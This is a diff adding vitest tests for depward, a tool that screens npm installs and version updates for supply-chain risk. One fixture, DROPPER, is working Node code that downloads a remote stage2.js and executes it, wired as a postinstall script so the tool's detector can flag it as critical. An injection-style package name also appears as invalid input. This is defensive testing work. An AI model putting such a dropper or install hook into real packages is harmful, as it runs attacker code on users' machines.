@@ -12,6 +12,7 @@ import { Client, StreamableHTTPClientTransport } from "@modelcontextprotocol/cli
 import { createMcpHandler } from "@modelcontextprotocol/server";
 import { afterEach, beforeAll, beforeEach, describe, expect, test } from "vitest";
 import { VERSION, createDepwardServer, type DepwardServerOptions } from "../src/index.ts";
+import { fakeRegistry } from "./fake-registry.ts";
 
 const FIXTURES = fileURLToPath(new URL("../../../fixtures/registry", import.meta.url));
 const NOW = Date.parse("2026-11-10T12:00:00.000Z");
@@ -66,14 +67,15 @@ async function call(c: Client, name: string, args: Record<string, unknown>): Pro
 const text = (r: ToolResult): string => r.content.map((b) => b.text ?? "").join("\n");
 
 describe("tools/list", () => {
-  test("advertises both tools as read-only, with input and output schemas", async () => {
+  test("advertises every tool as read-only, with input and output schemas", async () => {
     const { tools } = await (await connect()).listTools();
-    expect(tools.map((t) => t.name).toSorted()).toEqual(["check_install_command", "check_packages"]);
+    expect(tools.map((t) => t.name).toSorted()).toEqual(["check_install_command", "check_packages", "diff_versions"]);
     for (const t of tools) {
       expect(t.annotations).toMatchObject({ readOnlyHint: true, destructiveHint: false, openWorldHint: true });
       expect(t.outputSchema).toMatchObject({ type: "object" });
-      expect(t.description).toMatch(/deny/);
+      expect(t.description).toMatch(t.name === "diff_versions" ? /On "critical", do not update/ : /deny/);
     }
+    expect(tools.find((t) => t.name === "diff_versions")?.inputSchema).toMatchObject({ type: "object", required: ["name", "from", "to"] });
     const cmd = tools.find((t) => t.name === "check_install_command");
     expect(cmd?.description).toMatch(/^Call this BEFORE running any shell command that installs/);
     expect(cmd?.inputSchema).toMatchObject({ type: "object", required: ["command"] });
@@ -82,6 +84,7 @@ describe("tools/list", () => {
   test("the server's instructions tell the agent when to call it", async () => {
     const c = await connect();
     expect(c.getInstructions()).toMatch(/Call check_install_command BEFORE running any command that installs/);
+    expect(c.getInstructions()).toMatch(/call diff_versions/);
   });
 });
 
@@ -169,5 +172,82 @@ describe("config", () => {
     const r = await call(await connect(), "check_packages", { specs: ["depward-fixture-stable"] });
     expect(r.isError).toBe(true);
     expect(text(r)).toMatch(/^depward: INVALID_CONFIG: /);
+  });
+});
+
+const DROPPER = `const https = require("https");
+const { spawn } = require("child_process");
+https.get("https://cdn.example.invalid/stage2.js", (res) => {
+  let body = "";
+  res.on("data", (c) => (body += c));
+  res.on("end", () => spawn(process.execPath, ["-e", body]));
+});
+`;
+
+const diffRegistry = () => fakeRegistry({
+  "fx-pkg": {
+    "1.0.0": {},
+    "1.0.1": { files: { "index.js": "module.exports = 1;", "install.js": DROPPER }, scripts: { postinstall: "node install.js" } },
+    "1.1.0": { files: { "index.js": "module.exports = 2;" } },
+  },
+});
+
+describe("diff_versions", () => {
+  test("critical: a patch that adds a downloading postinstall", async () => {
+    const r = await call(await connect({ registry: diffRegistry() }), "diff_versions", { name: "fx-pkg", from: "1.0.0", to: "1.0.1" });
+    expect(r.isError).toBeFalsy();
+    const lines = text(r).split("\n");
+    expect(lines[0]).toBe("depward: risk critical for fx-pkg 1.0.0 → 1.0.1");
+    expect(lines.some((l) => l.startsWith("- high diff-new-install-script: "))).toBe(true);
+    expect(lines.at(-1)).toBe("Do not update. Stay on 1.0.0, or ask the user.");
+    expect(r.structuredContent).toMatchObject({ reportVersion: 1, tool: { name: "depward", version: VERSION }, risk: "critical" });
+    const pkg = ((r.structuredContent?.["packages"] ?? []) as { kind: string; from: string; to: string; findings: { id: string }[]; delta: { scripts: unknown } }[])[0];
+    expect(pkg).toMatchObject({ kind: "updated", from: "1.0.0", to: "1.0.1" });
+    expect(pkg?.findings.map((f) => f.id)).toContain("diff-new-network-in-non-network-pkg");
+    expect(pkg?.delta.scripts).toEqual({ postinstall: { to: "node install.js" } });
+  });
+
+  test("info: an ordinary update", async () => {
+    const r = await call(await connect({ registry: diffRegistry() }), "diff_versions", { name: "fx-pkg", from: "1.0.0", to: "1.1.0" });
+    expect(text(r).split("\n")).toEqual(["depward: risk info for fx-pkg 1.0.0 → 1.1.0", "depward found nothing in this update that needs attention."]);
+  });
+
+  test("the project config applies: allowed findings are shown but not counted", async () => {
+    await writeFile(join(cwd, "depward.config.json"), JSON.stringify({ allow: ["fx-pkg"] }));
+    const r = await call(await connect({ registry: diffRegistry() }), "diff_versions", { name: "fx-pkg", from: "1.0.0", to: "1.0.1" });
+    expect(r.structuredContent?.["risk"]).toBe("info");
+    expect(text(r)).toContain("findings allowed by the project's config (not counted).");
+  });
+
+  test("a missing version is reported in the result, not as a tool error", async () => {
+    const r = await call(await connect({ registry: diffRegistry() }), "diff_versions", { name: "fx-pkg", from: "1.0.0", to: "9.9.9" });
+    expect(r.isError).toBeFalsy();
+    expect(text(r)).toContain("- lookup failed (NOT_FOUND): fx-pkg@9.9.9 is not in the registry");
+    expect(text(r).split("\n").at(-1)).toBe("Part of the diff could not be checked. Tell the user before updating.");
+  });
+
+  test("an invalid name is a tool error, and an empty one fails the input schema", async () => {
+    const c = await connect({ registry: diffRegistry() });
+    const bad = await call(c, "diff_versions", { name: "../-/whoami", from: "1.0.0", to: "1.0.1" });
+    expect(bad.isError).toBe(true);
+    expect(text(bad)).toMatch(/^depward: INVALID_ARGUMENT: invalid package name/);
+    const empty = await call(c, "diff_versions", { name: "", from: "1.0.0", to: "1.0.1" });
+    expect(empty.isError).toBe(true);
+    expect(text(empty)).toMatch(/Input validation error/);
+  });
+});
+
+describe("the update path (M3.6)", () => {
+  test("check_packages diffs a package locked in the project at another version", async () => {
+    const registry = diffRegistry();
+    const integrity = (await registry.versionMeta("fx-pkg", "1.0.0"))?.dist.integrity;
+    await writeFile(join(cwd, "package-lock.json"), JSON.stringify({
+      name: "root", lockfileVersion: 3,
+      packages: { "": { name: "root" }, "node_modules/fx-pkg": { version: "1.0.0", resolved: "https://registry.npmjs.org/fx-pkg/-/fx-pkg-1.0.0.tgz", integrity } },
+    }));
+    const r = await call(await connect({ registry, gate: { data: createGateData([], []), now: () => NOW } }), "check_packages", { specs: ["fx-pkg@1.0.1"] });
+    expect(r.structuredContent?.["action"]).toBe("deny");
+    expect(((r.structuredContent?.["packages"] ?? []) as { update: unknown }[])[0]?.update).toEqual({ from: "1.0.0", lockfile: "package-lock.json" });
+    expect(text(r)).toContain("deny fx-pkg@1.0.1 (update from 1.0.0): diff-new-install-script");
   });
 });
